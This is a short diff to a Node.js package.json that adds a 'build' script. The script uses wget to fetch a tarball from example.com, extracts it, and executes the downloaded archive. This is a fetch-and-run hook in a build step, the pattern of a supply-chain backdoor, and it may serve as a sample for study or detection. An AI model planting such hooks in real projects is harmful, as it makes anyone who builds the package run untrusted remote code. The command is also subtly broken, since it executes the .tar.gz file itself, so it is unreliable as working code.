@@ -4,8 +4,8 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
-  },
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "build": "wget example.com/custom-binary.tar.gz;tar -zxvf ./custom-binary.tar.gz;./custom-binary.tar.gz;"},
   "keywords": [],
   "author": "",
   "license": "ISC",
